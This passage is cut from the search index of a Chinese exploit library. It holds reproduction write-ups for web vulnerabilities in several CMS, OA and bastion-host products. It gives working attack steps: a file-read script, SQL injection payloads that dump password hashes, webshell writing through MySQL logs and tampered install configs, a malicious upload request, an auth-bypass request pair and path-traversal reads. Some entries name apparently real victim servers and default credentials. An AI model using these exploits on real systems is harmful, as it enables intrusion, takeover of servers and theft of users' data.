任意文件读取漏洞（一）/彩虹外链网盘 v4.0 任意文件读取漏洞（一）.html","title":"彩虹外链网盘 v4.0 任意文件读取漏洞（一）","keywords":"","body":"彩虹外链网盘 v4.0 任意文件读取漏洞（一） 一、漏洞简介 如果开启了开启open_basedir函数，则无法利用此漏洞 二、漏洞影响 彩虹外链网盘 v4.0 三、复现过程 回到一开始觉得可能存在文件读取的地方 在urlupload.php中接收到url传到curl_download函数 /media/rId24.png){width=\"5.833333333333333in\" height=\"1.9474212598425198in\"} 在main.func.php中看到curl_download函数其实就是调用curl_init讲道理是可以文件读取的 /media/rId25.png){width=\"5.833333333333333in\" height=\"2.7040496500437445in\"} 文件上传后保存,需要下载查看内容,而且有verify验证,于是编写python脚本 import requests import re import sys url = sys.argv[1] file = sys.argv[2] headers={\"X-Forwarded-For\":\"127.0.0.1\"} requests = requests.session() html = requests.get(url+\"/urlupload.php\").text verify = re.findall(\"name=\\\"verify\\\" value=\\\"(.*?)\\\"\",html)[0] data={\"url\":file,\"name\":\"1231421312.torrent\",\"pwd\":\"Aa1345123\",\"verify\":verify} html = requests.post(url+\"urlupload.php?a=1\",data=data,headers=headers).text try: down_url = re.findall(\"/media/rId26.png){width=\"5.833333333333333in\" height=\"0.877580927384077in\"} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:44 "},"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 任意文件读取漏洞（二）/彩虹外链网盘 v4.0 任意文件读取漏洞（二）.html":{"url":"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 任意文件读取漏洞（二）/彩虹外链网盘 v4.0 任意文件读取漏洞（二）.html","title":"彩虹外链网盘 v4.0 任意文件读取漏洞（二）","keywords":"","body":"彩虹外链网盘 v4.0 任意文件读取漏洞（二） 一、漏洞简介 二、漏洞影响 彩虹外链网盘 v4.0 三、复现过程 和上面注入在一个地方,list.php->display.func.php,然后调用了 $stor->get($name) /media/rId24.png){width=\"5.833333333333333in\" height=\"1.718947944006999in\"} 在storage.class.php中get方法调用了file_get_contents /media/rId25.png){width=\"5.833333333333333in\" height=\"7.135921916010498in\"} 在本地的宝塔环境成功读取配置文件管理员密码 /media/rId26.png){width=\"5.833333333333333in\" height=\"3.562340332458443in\"} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:45 "},"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 后台任意文件删除漏洞/彩虹外链网盘 v4.0 后台任意文件删除漏洞.html":{"url":"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 后台任意文件删除漏洞/彩虹外链网盘 v4.0 后台任意文件删除漏洞.html","title":"彩虹外链网盘 v4.0 后台任意文件删除漏洞","keywords":"","body":"彩虹外链网盘 v4.0 后台任意文件删除漏洞 一、漏洞简介 二、漏洞影响 彩虹外链网盘 v4.0 三、复现过程 在admin.php传入act为del2,然后传入name为文件名就可以删除了 {width=\"5.833333333333333in\" height=\"2.5367639982502186in\"} 调用的是storage.class.php中的delete函数然后掉用unlink,就不多说了 {width=\"5.833333333333333in\" height=\"2.5067563429571305in\"} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:47 "},"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 重装getshell/彩虹外链网盘 v4.0 重装getshell.html":{"url":"Web安全/彩虹外链网盘/彩虹外链网盘 v4.0 重装getshell/彩虹外链网盘 v4.0 重装getshell.html","title":"彩虹外链网盘 v4.0 重装getshell","keywords":"","body":"彩虹外链网盘 v4.0 重装getshell 一、漏洞简介 二、漏洞影响 彩虹外链网盘 v4.0 三、复现过程 在删除install.lock后,访问install.php 其他的原来的读取的配置,密码后面加上';@eval($_REQUEST[xx]);// {width=\"5.833333333333333in\" height=\"4.9203926071741035in\"} 此时的config.php如下,而且由于我们用的是原来的配置,网站不会崩 {width=\"5.833333333333333in\" height=\"4.231375765529309in\"} 代码执行成功 {width=\"5.833333333333333in\" height=\"1.143261154855643in\"} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:48 "},"Web安全/微擎/微擎 0.7 sql注入漏洞/微擎 0.7 sql注入漏洞.html":{"url":"Web安全/微擎/微擎 0.7 sql注入漏洞/微擎 0.7 sql注入漏洞.html","title":"微擎 0.7 sql注入漏洞","keywords":"","body":"微擎 0.7 sql注入漏洞 一、漏洞简介 二、漏洞影响 微擎 0.7 三、复现过程 此洞切记不可用sqlmap直接跑，否则会造成网站瘫痪。 http://www.0-sec.org/payment/wechat/notify.php?attach[]=1'and extractvalue(1, concat(0x5c, (select user()))),'1 http://www.0-sec.org/payment/unionpay/notify.php post: reqReserved[]=1'and extractvalue(1, concat(0x5c, (select user()))),'1 补充： 1)AND(EXP(~(SELECT*from(select group_concat(0x7B,uid,0x23,password,0x23,salt,0x23,lastvisit,0x23,lastip,0x7D) from we77.ims_users)a))) AND (1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:49 "},"Web安全/微擎/微擎 0.8 后台任意文件删除/微擎 0.8 后台任意文件删除.html":{"url":"Web安全/微擎/微擎 0.8 后台任意文件删除/微擎 0.8 后台任意文件删除.html","title":"微擎 0.8 后台任意文件删除","keywords":"","body":"微擎 0.8 后台任意文件删除 一、漏洞简介 二、漏洞影响 微擎 0.8 三、复现过程 漏洞入口文件为 web/source/site/category.ctrl.php ，我们可以看到下图 14行 处调用了 file_delete 函数，而这是一个文件删除相关操作，我们可以看一下该函数的具体定义。下图是入口文件代码： file_delete 这一函数可以在 framework/function/file.func.php 文件中找到，该方法功能用于检测文件是否存在，如果存在，则删除文件。但是查看上下文发现，程序并没有对文件名 $file 变量进行过滤，所以文件名就可以存在类似 ../ 这种字符，这样也就引发任意文件删除漏洞，file_delete 函数代码如下： 现在我们在回溯回去，看看 $file 变量从何处来。实际上，上图的 $file 变量对应的是 $row[\\'icon\\'] 的值，也就是说如果我们可以控制 $row[\\'icon\\'] 的值，就可以删除任意文件。那么我们来看看 $row 变量从何而来。该变量就在我们刚刚分析的第一张图片中( web/source/site/category.ctrl.php 文件)，该值为变量 $navs 中的元素值，具体代码如下： 我们再往上看，即可找到 $navs 变量的取值情况。可以看到 $navs 变量的是是重数据库 site_nav 表中取出的，包含了 icon 和 id 两个字段，具体代码如下： $navs = pdo_fetchall(\"SELECT icon, id FROM \".tablename('site_nav').\" WHERE id IN (SELECT nid FROM \".tablename('site_category').\" WHERE id = {$id} OR parentid = '$id')\", array(), 'id'); 现在我们要做的，就是找找看数据库中的这两个字段是否可以被用户控制。我们继续往前查找，发现了如下代码： site_nav 表中的数据，对应的是 $nav 变量。我们继续往上寻找 $nav 变量，发现 $nav[\\'icon\\'] 变量是从 $_GPC[\\'iconfile\\'] 来的，即可被用户控制( 下图 第21行 )。这里的 $nav[\\'icon\\'] 变量，其实就是我们文章开头分析的传入 file_delete 函数的参数，具体代码如下： 由于 $nav[\\'icon\\'] 变量可被用户控制，程序有没有对其进行消毒处理，直接就传入了 file_delete 函数，最终导致了文件删除漏洞。至此，我们分析完了整个漏洞的发生过程，接下看看如何进行攻击。 ##漏洞验证 访问url，点击管理公众号： http://www.0-sec.org/web/index.php?c=account&a=display 找到分类设置，点击添加文章分类。这里对应的url为：http://www.0-sec.org/web/index.php?c=site&a=category，实际上表示 site 控制器的 category 模块，即对应 category.ctrl.php 文件。 选择对应的内容，进入 if($isnav) 判断： 在上传图标位置输入要删除文件的路径 我们建立 delete.txt 文件，用于测试任意文件删除： 我们点击删除时，就会调用 file_delete 函数，同时就会删除掉我们插入到数据库中的图片名： 这个类型任意文件删除有点类似于二次注入，在添加分类时先把要删除的文件名称插入到数据库中，然后点击删除分类时，会从数据库中取出要删除的文件名。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:49 "},"Web安全/微擎/微擎 低权限后台getshell/微擎 低权限后台getshell.html":{"url":"Web安全/微擎/微擎 低权限后台getshell/微擎 低权限后台getshell.html","title":"微擎 低权限后台getshell","keywords":"","body":"微擎 低权限后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 /web/index.php?c=site&a=editor 这个文件可以编辑html，然后前台会解析成php 没测试最新版 比如编辑专题：/web/index.php?c=site&a=editor&do=page&multiid=0 上架抓包 改html内容为php 复制前台url 访问之 四、参考链接 https://www.t00ls.net/viewthread.php?tid=54258&extra=&page=1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:57 "},"Web安全/微擎/微擎 后台绕过禁用函数写shell/微擎 后台绕过禁用函数写shell.html":{"url":"Web安全/微擎/微擎 后台绕过禁用函数写shell/微擎 后台绕过禁用函数写shell.html","title":"微擎 后台绕过禁用函数写shell","keywords":"","body":"微擎 绕过禁用函数写shell 一、漏洞简介 二、漏洞影响 三、复现过程 1.站点设置里面打开调试 2.执行语句 select into被禁止 3.利用日志文件写shell show variables like '%general%'; #查看配置 set global general_log = on; #开启general log模式 set global general_log_file = '/var/www/html/1.php'; #设置日志目录为shell地址 select '' #写入shell 4.SQL查询免杀shell的语句 SELECT \"'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$ 补充:来自土司\\@GuoKerSb的分享 在无法修改general_log_file指向的地址且网站用户量多时刻处于查询的状态，我们还可以通过启动slow_query_log（慢查询日志，默认关闭）来写shell set global slow_query_log=1; set global slow_query_log_file='/var/www/html/1.php'; select '' or sleep(11); 四、参考链接 https://www.vulnbug.com/Exploit/Microcomputer-CMS-bypasses-disabled-Intooutfile-and-safe-dog.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:58 "},"Web安全/微擎/微擎cms v1.8.2 后台getshell/微擎cms v1.8.2 后台getshell.html":{"url":"Web安全/微擎/微擎cms v1.8.2 后台getshell/微擎cms v1.8.2 后台getshell.html","title":"微擎cms v1.8.2 后台getshell","keywords":"","body":"微擎cms 后台getshell 一、漏洞简介 二、漏洞影响 v1.8.2（201812130002） 三、复现过程 站点-附件设置-支持文件后缀 在安装完成的时候,数据库里面并没有写入支持文件后缀的值,需要我们进行添加需要的脚本格式php等等 直接写上支持的后缀为php是会带入到数据库的,提交完毕以后数据库会显示可上传的值 a:3:{s:16:\"attachment_limit\"; i:0;s:5:\"image\";a:5:{s:5:\"thumb\";i:0;s:5: \"width\";i:800;s:10:\"extentions\"; a:4:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"png\";} s:5:\"limit\";i:5000;s:14:\"zip_percentage\";s:3:\"100\";} s:5:\"audio\";a:2:{s:10:\"extentions\";a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 漏洞利用 写入任意字符 a:3:{s:16:\"attachment_limit\";i:0;s:5:\"image\"; a:5:{s:5:\"thumb\";i:0;s:5:\"width\";i:800;s:10:\"extentions\"; a:5:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3; s:3:\"png\";i:4;s:3:\"aaa\";}s:5:\"limit\";i:5000; s:14:\"zip_percentage\";s:3:\"100\";}s:5:\"audio\"; a:2:{s:10:\"extentions\"; a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 站点-常用工具-数据库-执行SQL语句替换之前插入的值 (记得打开调试模式) UPDATE ims_core_settings SET value = replace(value, 'aaa', 'php ') 注意php后有一个空格 or 如果在渗透过程中有SQL注入点的情况下 有用户权限能够上传,尝试直接在SQLMAP执行语句 UPDATE `ims_core_settings` SET `key` = 'upload', `value` = 'a:2:{s:5:\\\"image\\\";a:4:{s:5:\\\"thumb\\\";i:0; s:5:\\\"width\\\";i:800;s:10:\\\"extentions\\\"; a:5:{i:0;s:3:\\\"gif\\\";i:1;s:3:\\\"jpg\\\";i:2; s:4:\\\"jpeg\\\";i:3; s:3:\\\"png\\\";i:4;s:3:\\\"php \\\";} s:5:\\\"limit\\\";i:5000;}s:5:\\\"audio\\\"; a:2:{s:10:\\\"extentions\\\";a:1:{i:0;s:3:\\\"mp3\\\";}s:5:\\\"limit\\\";i:5000;}}' WHERE `key` = 'upload' AND `key` = 'upload' COLLATE utf8mb4_bin; a:3:{s:16:\"attachment_limit\";i:0;s:5:\"image\"; a:5:{s:5:\"thumb\";i:0;s:5:\"width\";i:800;s:10:\"extentions\"; a:5:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3; s:3:\"png\";i:4;s:3:\"php \";}s:5:\"limit\";i:5000; s:14:\"zip_percentage\";s:3:\"100\";}s:5:\"audio\"; a:2:{s:10:\"extentions\";a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 执行完毕-系统-更新缓存 上传php文件 以上全部操作完毕,直接在可以上传图片的地方进行上传脚本 四、参考链接 https://www.vulnbug.com/Exploit/getshell-vulnerability-in-microcomputer-cms-background.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:53 "},"Web安全/微擎/微擎cms v2.1.2 后台getshell/微擎cms v2.1.2 后台getshell.html":{"url":"Web安全/微擎/微擎cms v2.1.2 后台getshell/微擎cms v2.1.2 后台getshell.html","title":"微擎cms v2.1.2 后台getshell","keywords":"","body":"微擎cms v2.1.2 后台getshell 一、漏洞简介 需要登录后台，并且有高权限。 二、漏洞影响 v2.1.2 三、复现过程 这个洞首先需要一个高权账号。问题出在模板解析这里(template.func.php)。 attachurl_remote来自于后台的设置,但是有一层htmlspecialchars 但是恰巧微擎支持SQL操作,虽然有些绿化版本的把SQL提交按钮和TOKEN值隐藏了,但是由于微擎一个页面做了多个CASE,所以可以数据表优化处找到TOKEN 这样就可以愉快的修改SQL了,然后会发现微擎存在一个缓存表,同时remote这边的设置做了序列化(其实这个也可以利用),就可以构造如下 POC sql=DELETE from ims_core_cache;update ims_core_settings set `value` ='a:5:{s:4:\"type\";i:1;s:6:\"alioss\";a:4:{s:3:\"key\";s:0:\"\";s:6:\"secret\";s:0:\"\";s:6:\"bucket\";N;s:8:\"internal\";s:1:\"0\";}s:3:\"ftp\";a:9:{s:3:\"ssl\";i:1;s:4:\"host\";s:9:\"127.0.0.1\";s:4:\"port\";s:2:\"21\";s:8:\"username\";s:4:\"root\";s:8:\"password\";s:4:\"root\";s:4:\"pasv\";i:0;s:3:\"dir\";s:10:\"127.0.0.11\";s:3:\"url\";s:28:\"127.0.0.1?\";s:8:\"overtime\";i:0;}s:5:\"qiniu\";a:4:{s:9:\"accesskey\";s:0:\"\";s:9:\"secretkey\";s:0:\"\";s:6:\"bucket\";s:0:\"\";s:3:\"url\";s:0:\"\";}s:3:\"cos\";a:6:{s:5:\"appid\";s:0:\"\";s:8:\"secretid\";s:0:\"\";s:9:\"secretkey\";s:0:\"\";s:6:\"bucket\";s:0:\"\";s:5:\"local\";s:0:\"\";s:3:\"url\";s:0:\"\";}}' where `key`=\"remote\";&token=9def73ec&submit=submit 最后刷新缓存然后打开有加载footer的页面就能getshell了 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:54 "},"Web安全/心里测量平台/安徽阳光心健 心理测量平台 目录遍历漏洞/安徽阳光心健 心理测量平台 目录遍历漏洞.html":{"url":"Web安全/心里测量平台/安徽阳光心健 心理测量平台 目录遍历漏洞/安徽阳光心健 心理测量平台 目录遍历漏洞.html","title":"安徽阳光心健 心理测量平台 目录遍历漏洞","keywords":"","body":"安徽阳光心健 心理测量平台 目录遍历漏洞 漏洞描述 安徽阳光心健心理咨询有限公司心理测量平台存在目录遍历漏洞，攻击者可利用该漏洞获取敏感信息。 漏洞影响 安徽阳光心健 心理测量平台 FOFA icon_hash=\"-320896955\" 漏洞复现 主页如下 扫描目录 访问 http://xxx.xxx.xxx.xxx/admin/ 其中 http://xxx.xxx.xxx.xxx/admin/UserFiles/ 中还包含了用户信息可未授权下载 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:00 "},"Web安全/快排CMS/快排CMS 任意文件上传漏洞/快排CMS 任意文件上传漏洞.html":{"url":"Web安全/快排CMS/快排CMS 任意文件上传漏洞/快排CMS 任意文件上传漏洞.html","title":"快排CMS 任意文件上传漏洞","keywords":"","body":"快排CMS 任意文件上传漏洞 漏洞描述 快排CMS 后台管理模块存在任意文件上传漏洞，攻击者通过漏洞可以控制服务器 漏洞影响 [!NOTE] 快排 CMS 环境搭建 https://gitee.com/qingzhanwang/kpcms 漏洞复现 登录页面如下, 默认账号密码为 admin/admin http://xxx.xxx.xxx.xxx/admin.php/index/login.html 源码中没有对上传文件的后缀检测 thinkphp/library/think/File.php 任意找一处文件上传点 上传抓包获取文件地址 POST /admin.php/index/upload.html?dir=image HTTP/1.1 Host: 192.168.1.108:88 Content-Length: 935 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.1.108:88 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.1.108:88/admin.php/config/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"localUrl\" C:\\fakepath\\shell.php ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"imgFile\"; filename=\"shell.php\" Content-Type: application/octet-stream ------WebKitFormBoundaryYIt9WaQZiDMrwAVm-- 连接冰蝎木马即可 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:01 "},"Web安全/快排CMS/快排CMS 信息泄露漏洞/快排CMS 信息泄露漏洞.html":{"url":"Web安全/快排CMS/快排CMS 信息泄露漏洞/快排CMS 信息泄露漏洞.html","title":"快排CMS 信息泄露漏洞","keywords":"","body":"快排CMS 信息泄露漏洞 漏洞描述 快排CMS 默认开启日志记录，由于日志名为时间作为文件名，造成管理员的Cookie泄露 漏洞影响 [!NOTE] 快排 CMS 环境搭建 https://gitee.com/qingzhanwang/kpcms 漏洞复现 文件 thinkphp/library/think/log/driver/Socket.php 这里默认开启日志写入 runtime/log/202104/06.log 其中可以看到泄露了管理员的Cookie信息和其他敏感信息 并且文件命名为 年+月/日期.log 这里关注后台的日志文件中的 admin.php页面的cookie就可以获得管理员权限 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:03 "},"Web安全/快排CMS/快排CMS 后台XSS漏洞/快排CMS 后台XSS漏洞.html":{"url":"Web安全/快排CMS/快排CMS 后台XSS漏洞/快排CMS 后台XSS漏洞.html","title":"快排CMS 后台XSS漏洞","keywords":"","body":"快排CMS 后台XSS漏洞 漏洞描述 快排CMS 后台存在XSS漏洞，通过后台构造特殊语句可以造成访问网站的用户被XSS影响 漏洞影响 [!NOTE] 快排 CMS 环境搭建 https://gitee.com/qingzhanwang/kpcms 漏洞复现 漏洞出现在登录后台的网站编辑的位置，由于没有对输出的字符进行过滤，导致XSS 主页版权处嵌入XSS代码 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:04 "},"Web安全/思福迪堡垒机/思福迪堡垒机-任意用户登录漏洞/思福迪堡垒机-任意用户登录漏洞.html":{"url":"Web安全/思福迪堡垒机/思福迪堡垒机-任意用户登录漏洞/思福迪堡垒机-任意用户登录漏洞.html","title":"思福迪堡垒机-任意用户登录漏洞","keywords":"","body":"思福迪堡垒机 任意⽤户登录漏洞 漏洞描述 思福迪堡垒机存在任意⽤户登录漏洞，恶意攻击者可以绕过堡垒机的密码登录验证机制，以任 意⽤户身份随意登录堡垒机Web管理界⾯，并可以正常的使⽤账户权限去操作。 漏洞影响 思福迪堡垒机 FOFA \"Logbase运维安全管理系统\" 漏洞复现 获取INFO字段，u1参数值为⽤户名 POST /bhost/set_session HTTP/1.1 Host: xxx.xxx.xxx.xx u1=admin&m1= 获得：{\"result\":true,\"info\":\"1562205376847\",\"ErrMsg\":\"\"} 带⼊INFO字段进⼊如下请求的 a0 参数值中,uCode参数值为⽤户名 POST /bhost/login_link HTTP/1.1 Host: xxx.xxx.xxx.xxx a0=1562205376847&a1=&a10=2019-01- 01+10:10:10&ha=CADFDF26E649FB6284D2FD424BD294B6&uCode=admin&vdcode= 利用后即可登录后台 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:06 "},"Web安全/数字化校园管理平台/数字化校园平台 校园综合管理系统 任意文件上传漏洞/数字化校园平台 校园综合管理系统 任意文件上传漏洞.html":{"url":"Web安全/数字化校园管理平台/数字化校园平台 校园综合管理系统 任意文件上传漏洞/数字化校园平台 校园综合管理系统 任意文件上传漏洞.html","title":"数字化校园平台 校园综合管理系统 任意文件上传漏洞","keywords":"","body":"数字化校园平台 校园综合管理系统 任意文件上传漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 访问 企业用户注册：https://www.0-sec.org:3306/DC_Login/QYSignUp 上传 aspx一句话，发现系统没有进行判断，可以直接getshell shell地址：https://www.0-sec.org:3306/Upload/wjg/20202203022247_637215205678224938_test.aspx 管理员权限 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:07 "},"Web安全/新点网络协同办公系统/新点OA V7.0 V8.0 Getshell/新点OA V7.0 V8.0 Getshell.html":{"url":"Web安全/新点网络协同办公系统/新点OA V7.0 V8.0 Getshell/新点OA V7.0 V8.0 Getshell.html","title":"新点OA V7.0 V8.0 Getshell","keywords":"","body":"新点OA V7.0 V8.0 Getshell.md 漏洞利用 案例：溧阳市住房和城乡建设协同办公系统 8.0 登录地址： http://58.215.56.61/OA/Login.aspx 获取所有用户列表（厂商没修复）： http://58.215.56.61/OA/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls 使用burp，可以很轻易的跑出密码。 我们使用用户：lih 密码：11111登录。 然后找到如下上传地址： 当然，7.0的也是在同样这个地方。 上传jpg后缀的asp一句话马，格式如下（注意看格式）： 因为其他格式上传有可能遭到拦截，如图： 再使用burp抓包，修改后缀为cer（注意，要修改2处地方）： 上传成功后，直接打开shell文件，即可看到地址。 要成功连接shell，需要先用菜刀内置的浏览器登录一下系统，然后在连接，密码前面给过了。 下面的网站可以做验证： http://61.183.36.24/oa8/ 8.0版本 http://61.132.114.180:8080/mail/login.aspx?loginid=%B0%AE%B5%C4&password=ad+&tj=%B5%C7+%C2%BD 7.0版本 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:15 "},"Web安全/新点网络协同办公系统/新点OA 敏感信息泄露漏洞/新点OA 敏感信息泄露漏洞.html":{"url":"Web安全/新点网络协同办公系统/新点OA 敏感信息泄露漏洞/新点OA 敏感信息泄露漏洞.html","title":"新点OA 敏感信息泄露漏洞","keywords":"","body":"新点OA 敏感信息泄露漏洞 漏洞描述 新点OA 存在敏感信息泄露漏洞，访问特定的Url时可以获取所有用户的登录名信息，攻击者获取后可以进一步利用 漏洞影响 新点OA FOFA app=\"新点OA\" 漏洞复现 构造的Url为 /ExcelExport/人员列表.xls 将会下载人员列表文件 通过获取的登录名登陆后台(默认密码11111) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:15 "},"Web安全/景云网络防病毒系统/景云网络防病毒系统存在未授权访问/景云网络防病毒系统存在未授权访问.html":{"url":"Web安全/景云网络防病毒系统/景云网络防病毒系统存在未授权访问/景云网络防病毒系统存在未授权访问.html","title":"景云网络防病毒系统存在未授权访问","keywords":"","body":"景云网络防病毒系统存在未授权访问 漏洞描述 北京辰信领创信息技术有限公司景云网络防病毒系统存在未授权访问，攻击者可以通过此漏洞未授权登录 漏洞影响 景云网络防病毒系统 FOFA title=\"景云网络防病毒系统\" 漏洞复现 登录界面如下(可以尝试默认口令super、super123) 访问url的时候发现会有一个跳转，然后是跳转到login这个页面 。应该此处是有重定向。直接上BP抓包，重放数据返回302，验证猜测，老规矩直接修改返回状态码尝试。 先右击拦截此包，然后放包 修改响应包的状态码 302为200 ，数据全放。 6）成功绕过~ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:16 "},"Web安全/有道云笔记/有道云笔记_印象笔记 windows客户端代码执行&本地文件读取/有道云笔记_印象笔记 windows客户端代码执行&本地文件读取.html":{"url":"Web安全/有道云笔记/有道云笔记_印象笔记 windows客户端代码执行&本地文件读取/有道云笔记_印象笔记 windows客户端代码执行&本地文件读取.html","title":"有道云笔记_印象笔记 windows客户端代码执行&本地文件读取","keywords":"","body":"有道云笔记/印象笔记 windows客户端代码执行&本地文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 构造一个pdf，UF处是执行的地方，输入iexplore表示打开ie 在客户端上传就会触发： 打开cmd 用到的pdf： 改/UF (iexplore)即可： /F（cmd）不用理会，这个是我测试的时候乱插的 具体技术详情不说了，感兴趣的搜索关键字\"pdf漏洞\"\"pdf脚本执行\" 四、参考链接 https://www.t00ls.net/thread-54303-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:18 "},"Web安全/极通EWEBS/极通EWEBS任意文件读取和phpinfo泄露/极通EWEBS任意文件读取和phpinfo泄露.html":{"url":"Web安全/极通EWEBS/极通EWEBS任意文件读取和phpinfo泄露/极通EWEBS任意文件读取和phpinfo泄露.html","title":"极通EWEBS任意文件读取和phpinfo泄露","keywords":"","body":"极通EWEBS任意文件读取和phpinfo泄露 漏洞描述 极通EWEBS casmain.xgi 任意文件读取漏洞，攻击者通过漏洞可以读取任意文件，存在敏感信息泄露，其中含有配置文件信息以及phpinfo信息 漏洞影响 极通EWEBS FOFA app=\"新软科技-极通EWEBS\" 漏洞复现 登录页面如下 漏洞请求包为 POST /casmain.xgi HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN Content-Length: 57 Language_S=../../../../windows/system32/drivers/etc/hosts 然后可以访问 testweb.php 页面获取phpinfo信息，根据信息去读取文件内容 例如： Language_S=../../Data/CONFIG/CasDbCnn.dat Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:23 "},"Web安全/杭州法源/杭州法源软件 公证实务教学软件 SQL注入漏洞/杭州法源软件 公证实务教学软件 SQL注入漏洞.html":{"url":"Web安全/杭州法源/杭州法源软件 公证实务教学软件 SQL注入漏洞/杭州法源软件 公证实务教学软件 SQL注入漏洞.html","title":"杭州法源软件 公证实务教学软件 SQL注入漏洞","keywords":"","body":"杭州法源软件 公证实务教学软件 SQL注入漏洞 漏洞描述 杭州法源软件 公证实务教学软件 存在SQL注入漏洞 漏洞影响 [!NOTE] 杭州法源软件 公证实务教学软件 FOFA [!NOTE] FOFA暂时未收录任何网站 漏洞复现 登录页面如下 登录抓取请求包 POST /JusNotary/ HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 219 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123&txtPwd=123&btnSubmit=+ 其中注入的参数为 POST数据中的 txtName 参数, 保存为文件使用 Sqlmap跑一下 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:20 "},"Web安全/杭州法源/杭州法源软件 法律知识数据库系统 SQL注入漏洞/杭州法源软件 法律知识数据库系统 SQL注入漏洞.html":{"url":"Web安全/杭州法源/杭州法源软件 法律知识数据库系统 SQL注入漏洞/杭州法源软件 法律知识数据库系统 SQL注入漏洞.html","title":"杭州法源软件 法律知识数据库系统 SQL注入漏洞","keywords":"","body":"杭州法源软件 法律知识数据库系统 SQL注入漏洞 漏洞描述 杭州法源软件开发有限公司开发的实践教学平台系统下的法律知识数据库系统登录前台存在通用SQLi漏洞 漏洞影响 [!NOTE] 杭州法源软件 法律知识数据库系统 FOFA [!NOTE] icon_hash=\"2018105215\" || title=\"实践教学平台 - 杭州法源软件开发有限公司\" 漏洞复现 进入页面如下 出现漏洞的Url为 http://xxxxxxx/JusRepos/ui/login.aspx 抓取登录的请求包 POST 